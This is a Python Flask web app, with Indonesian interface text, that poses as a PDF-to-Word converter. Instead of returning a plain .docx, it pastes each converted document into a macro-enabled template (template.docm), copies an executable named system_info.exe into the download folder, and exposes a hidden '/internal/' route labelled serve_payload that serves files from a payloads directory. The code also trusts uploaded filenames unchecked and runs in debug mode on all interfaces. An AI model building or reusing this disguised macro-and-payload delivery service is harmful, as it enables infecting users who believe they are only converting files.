from flask import Flask, render_template, request, redirect, url_for, send_from_directory
from pdf2docx import Converter
import os
import shutil
import pythoncom
import win32com.client as win32

app = Flask(__name__)

BASE_DIR = os.path.abspath(os.path.dirname(__file__))

UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
TEMPLATE_MACRO = os.path.join(BASE_DIR, 'template.docm')
SYSTEM_EXE = os.path.join(BASE_DIR, 'system_info.exe')
FINAL_DOCM_SUFFIX = '.docm'

@app.route('/')
def index():
    return render_template('index.html', docx_file=None)

@app.route('/convert', methods=['POST'])
def convert_pdf_to_word():
    if 'pdf_file' not in request.files or request.files['pdf_file'].filename == '':
        return render_template('index.html', message="Silakan pilih file PDF terlebih dahulu.", docx_file=None)

    pdf_file = request.files['pdf_file']
    pdf_filename = pdf_file.filename
    pdf_file_path = os.path.join(UPLOAD_FOLDER, pdf_filename)
    docx_filename = os.path.splitext(pdf_filename)[0] + '.docx'
    docx_file_path = os.path.join(UPLOAD_FOLDER, docx_filename)

    pdf_file.save(pdf_file_path)

    try:
        cv = Converter(pdf_file_path)
        cv.convert(docx_file_path, start=0, end=None)
        cv.close()

        final_docm_filename = os.path.splitext(pdf_filename)[0] + FINAL_DOCM_SUFFIX
        final_docm_path = os.path.join(UPLOAD_FOLDER, final_docm_filename)

        shutil.copy2(TEMPLATE_MACRO, final_docm_path)

        pythoncom.CoInitialize()
        word = win32.gencache.EnsureDispatch('Word.Application')
        word.Visible = False

        try:
            doc = word.Documents.Open(os.path.abspath(final_docm_path))
            selection = word.Selection
            selection.EndKey(Unit=6)
            selection.InsertFile(os.path.abspath(docx_file_path))
            doc.Save()
            doc.Close()
        finally:
            word.Quit()
            del word  # pastikan dilepas dari memory

        exe_path = os.path.join(UPLOAD_FOLDER, SYSTEM_EXE)
        if not os.path.exists(exe_path):
            shutil.copy2(SYSTEM_EXE, exe_path)

        message = f'File {pdf_filename} telah berhasil dikonversi menjadi {final_docm_filename}'
        return render_template('index.html', message=message, docx_file=final_docm_filename)

    except Exception as e:
        message = f'Terjadi kesalahan: {str(e)}'
        return render_template('index.html', message=message, docx_file=None)

@app.route('/download/<filename>')
def download_file(filename):
    return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)

@app.route("/internal/<filename>")
def serve_payload(filename):
    return send_from_directory('payloads', filename, as_attachment=True)

if __name__ == '__main__':
    if not os.path.exists(UPLOAD_FOLDER):
        os.makedirs(UPLOAD_FOLDER)
    app.run(debug=True, host='0.0.0.0')
